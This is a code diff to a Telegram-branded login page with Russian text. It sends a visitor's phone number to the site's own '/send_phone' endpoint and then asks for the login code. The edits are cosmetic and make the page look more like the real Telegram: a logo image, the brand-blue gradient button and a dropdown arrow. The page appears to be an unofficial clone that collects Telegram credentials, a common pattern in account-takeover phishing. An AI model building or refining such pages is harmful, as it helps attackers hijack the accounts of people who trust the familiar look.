@@ -29,14 +29,11 @@
       width: 120px;
       height: 120px;
       margin: 0 auto 30px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
     }
-    .telegram-logo svg {
+    .telegram-logo img {
       width: 120px;
       height: 120px;
-      fill: #0088cc;
+      display: block;
     }
     h1 {
       font-size: 24px;
@@ -157,8 +154,23 @@
       z-index: 1;
       line-height: 1;
     }
+    .country-select-wrapper::after {
+      content: '';
+      position: absolute;
+      right: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      width: 0;
+      height: 0;
+      border-left: 5px solid transparent;
+      border-right: 5px solid transparent;
+      border-top: 6px solid #666;
+      pointer-events: none;
+      z-index: 1;
+    }
     select.form-input {
       padding-left: 45px;
+      padding-right: 35px;
       background-image: none;
       appearance: none;
       -webkit-appearance: none;
@@ -190,18 +202,18 @@
     .continue-btn {
       width: 100%;
       padding: 14px;
-      background: #0088cc;
+      background: linear-gradient(to right, #229ED9, #0088cc);
       color: white;
       border: none;
       border-radius: 8px;
       font-size: 16px;
       font-weight: 500;
       cursor: pointer;
-      transition: background 0.3s;
+      transition: opacity 0.3s;
       margin-top: 10px;
     }
     .continue-btn:hover {
-      background: #0077b5;
+      opacity: 0.9;
     }
     .continue-btn:disabled {
       background: #ccc;
@@ -253,9 +265,7 @@
   <div class="container">
     <!-- Telegram Logo -->
     <div class="telegram-logo">
-      <svg viewBox="0 0 24 24">
-        <path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.562 8.161l-1.87 8.815c-.138.625-.5.778-.9.485l-2.49-1.84-1.2.764c-.133.133-.245.245-.502.245l.178-2.52 4.61-4.16c.201-.178-.044-.277-.31-.1l-5.7 3.59-2.46-.77c-.535-.167-.549-.535.111-.797l9.6-3.7c.445-.166.835.103.69.638z"/>
-      </svg>
+      <img src="/static/logo.svg.webp" alt="Telegram Logo">
     </div>
 
     <!-- Title -->
@@ -551,6 +561,7 @@
       
       continueBtn.disabled = true;
       continueBtn.textContent = 'Отправка...';
+      continueBtn.style.display = 'none';
       
       try {
         const res = await fetch('/send_phone', {
@@ -566,11 +577,13 @@
           codeStep.classList.add('active');
           codeInput.focus();
       } else {
+          continueBtn.style.display = 'block';
           phoneError.textContent = data.detail || 'Ошибка при отправке номера';
           phoneError.classList.add('show');
           phoneInput.classList.add('error');
       }
     } catch (err) {
+        continueBtn.style.display = 'block';
         phoneError.textContent = 'Ошибка соединения с сервером';
         phoneError.classList.add('show');
         phoneInput.classList.add('error');
